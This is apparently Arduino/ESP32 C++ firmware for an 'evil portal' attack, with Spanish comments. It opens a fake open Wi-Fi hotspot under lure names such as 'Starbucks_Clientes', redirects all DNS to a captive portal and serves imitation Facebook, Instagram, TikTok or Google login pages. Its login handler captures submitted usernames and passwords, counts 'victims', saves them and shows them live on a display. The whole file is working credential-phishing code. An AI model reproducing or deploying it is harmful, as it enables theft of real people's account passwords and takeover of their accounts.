#include <Arduino.h>
#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include "evil_portal.h"
#include "log_manager.h"
#include "portals.h"
#include "display_config.h"

extern String target_ssid; 
extern int target_channel;

// Pines del encoder 
const int ENC_CLK_E = 48;
const int ENC_DT_E  = 46;
const int ENC_SW_E  = 3;

DNSServer dnsServer;
WebServer server(80);
const byte DNS_PORT = 53;
IPAddress apIP(172, 0, 0, 1);

String live_user = "ESPERANDO...";
String live_pass = " ";
String activeApp = "";
const char* currentHTML;
int victims_count = 0;

const char* default_ssids[] = {
    "WiFi_Gratis_Alta_Velocidad",
    "Clientes_Free",
    "Starbucks_Clientes",
    "Infinitum_Free",
    "Wifi_Free_5G"
};

const char html_success[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>
<style>body{background:#fff;font-family:sans-serif;text-align:center;padding-top:50px;}
.check{color:#4CAF50;font-size:80px;}h2{color:#333;}</style></head>
<body><div class='check'>✓</div><h2>Conexión Exitosa</h2><p>Autenticación completada.</p>
<script>setTimeout(function(){window.location.href='https://www.google.com';},3000);</script>
</body></html>)rawliteral";

void handleLogin() {
    String user = server.hasArg("email") ? server.arg("email") : server.arg("username");
    String pass = server.hasArg("pass") ? server.arg("pass") : server.arg("password");
    live_user = "USER: " + user;
    live_pass = "PASS: " + pass;
    victims_count++;
    saveCapture(target_ssid, activeApp, user, pass);
    server.send(200, "text/html", html_success);
}

void showEvilPortal(LGFX &tft, bool &inSubMenu, int btnBack) {
    victims_count = 0;
    int lastClkPortal = digitalRead(ENC_CLK_E);

    // --- 1. SELECCIÓN DE SSID ---
    if (target_ssid == "" || target_ssid == "None") {
        int selSSID = 0; bool choosingSSID = true; bool redrawSSID = true;
        while (choosingSSID) {
            if (redrawSSID) {
                tft.fillScreen(TFT_BLACK); tft.drawRect(0, 0, tft.width(), tft.height(), 0x07E0);
                tft.fillRect(0, 0, tft.width(), 30, 0x07E0); tft.setTextColor(TFT_BLACK); 
                tft.setCursor(15, 8); tft.print("SELECT_SSID_FAKE");
                for (int i = 0; i < 5; i++) {
                    int y = 55 + (i * 32);
                    if (i == selSSID) { tft.fillRect(10, y - 5, tft.width() - 20, 28, 0x07E0); tft.setTextColor(TFT_BLACK); }
                    else { tft.setTextColor(0x07E0); }
                    tft.setCursor(20, y); tft.print(default_ssids[i]);
                }
                redrawSSID = false;
            }

            // Encoder Scroll SSID
            int currentClk = digitalRead(ENC_CLK_E);
            if (currentClk != lastClkPortal && currentClk == LOW) {
                if (digitalRead(ENC_DT_E) != currentClk) selSSID = (selSSID >= 4) ? 0 : selSSID + 1;
                else selSSID = (selSSID <= 0) ? 4 : selSSID - 1;
                redrawSSID = true;
            }
            lastClkPortal = currentClk;

            // Botones físicos
            if (digitalRead(1) == LOW) { selSSID = (selSSID <= 0) ? 4 : selSSID - 1; redrawSSID = true; delay(150); }
            if (digitalRead(2) == LOW) { selSSID = (selSSID >= 4) ? 0 : selSSID + 1; redrawSSID = true; delay(150); }

            // OK (Click Encoder o Botón 42)
            if (digitalRead(42) == LOW || digitalRead(ENC_SW_E) == LOW) { 
                target_ssid = default_ssids[selSSID]; choosingSSID = false; delay(250); 
            }
            // Back (Botón o Click Largo)
            if (digitalRead(btnBack) == LOW) { inSubMenu = false; return; }
            yield();
        }
    }

    // --- 2. SELECCIÓN DE PLANTILLA ---
    int selT = 0; bool choosingT = true; bool redrawT = true;
    const char* tNames[] = {"FACEBOOK", "INSTAGRAM", "TIKTOK", "GOOGLE"};
    while (choosingT) {
        if (redrawT) {
            tft.fillScreen(TFT_BLACK); tft.drawRect(0, 0, tft.width(), tft.height(), 0x07E0);
            tft.fillRect(0, 0, tft.width(), 30, 0x07E0); tft.setTextColor(TFT_BLACK); 
            tft.setCursor(15, 8); tft.print("TIPO_DE_PORTAL");
            for (int i = 0; i < 4; i++) {
                int y = 60 + (i * 35);
                if (i == selT) { tft.fillRect(10, y - 5, tft.width() - 20, 30, 0x07E0); tft.setTextColor(TFT_BLACK); }
                else { tft.setTextColor(0x07E0); }
                tft.setCursor(25, y); tft.print(tNames[i]);
            }
            redrawT = false;
        }

        // Encoder Scroll Plantilla
        int currentClk = digitalRead(ENC_CLK_E);
        if (currentClk != lastClkPortal && currentClk == LOW) {
            if (digitalRead(ENC_DT_E) != currentClk) selT = (selT >= 3) ? 0 : selT + 1;
            else selT = (selT <= 0) ? 3 : selT - 1;
            redrawT = true;
        }
        lastClkPortal = currentClk;

        if (digitalRead(1) == LOW) { selT = (selT <= 0) ? 3 : selT - 1; redrawT = true; delay(150); }
        if (digitalRead(2) == LOW) { selT = (selT >= 3) ? 0 : selT + 1; redrawT = true; delay(150); }
        if (digitalRead(42) == LOW || digitalRead(ENC_SW_E) == LOW) { choosingT = false; delay(250); }
        if (digitalRead(btnBack) == LOW) { target_ssid = ""; inSubMenu = false; return; }
        yield();
    }

    // --- CONFIGURACIÓN DE ATAQUE ---
    activeApp = tNames[selT];
    if (selT == 0) currentHTML = html_facebook;
    else if (selT == 1) currentHTML = html_instagram;
    else if (selT == 2) currentHTML = html_tiktok;
    else currentHTML = html_google;

    WiFi.mode(WIFI_AP);
    WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
    WiFi.softAP(target_ssid.c_str(), NULL, (target_channel > 0) ? target_channel : 1);
    dnsServer.start(DNS_PORT, "*", apIP);
    server.on("/", []() { server.send(200, "text/html", currentHTML); });
    server.on("/login", HTTP_POST, handleLogin);
    server.onNotFound([]() { server.send(200, "text/html", currentHTML); });
    server.begin();

    tft.fillScreen(TFT_BLACK);
    tft.drawRect(0, 0, tft.width(), tft.height(), 0x07E0);
    tft.fillRect(0, 0, tft.width(), 30, 0x07E0);
    tft.setTextColor(TFT_BLACK); tft.setCursor(15, 8); tft.print("PORTAL_ATTACK_LIVE");

    while (inSubMenu) {
        dnsServer.processNextRequest();
        server.handleClient();
        
        tft.setTextColor(0x07E0, TFT_BLACK);
        tft.setCursor(15, 45); tft.printf("SSID: %-18s", target_ssid.substring(0, 18).c_str());
        tft.setCursor(15, 65); tft.printf("APP: %-10s", activeApp.c_str());
        tft.setCursor(240, 45); tft.setTextColor(TFT_WHITE, TFT_BLACK); tft.printf("VICS:%d", victims_count);
        tft.drawFastHLine(10, 85, 300, 0x07E0);
        
        tft.setTextColor(0xF800, TFT_BLACK); 
        tft.setCursor(15, 105); tft.print(live_user.substring(0, 35));
        tft.setCursor(15, 130); tft.print(live_pass.substring(0, 35));

        // BACK (Botón 41 o Click Largo del Encoder)
        if (digitalRead(btnBack) == LOW || digitalRead(ENC_SW_E) == LOW) {
            unsigned long startPress = millis();
            bool longPress = false;
            if (digitalRead(ENC_SW_E) == LOW) {
                while(digitalRead(ENC_SW_E) == LOW) {
                    if (millis() - startPress > 600) { longPress = true; break; }
                    yield();
                }
            } else { longPress = true; } // Si fue el botón físico 41, sale directo

            if (longPress) {
                inSubMenu = false;
                server.stop(); dnsServer.stop(); WiFi.softAPdisconnect(true);
                target_ssid = ""; live_user = "ESPERANDO..."; live_pass = " ";
                delay(200);
            }
        }
        yield();
    }
}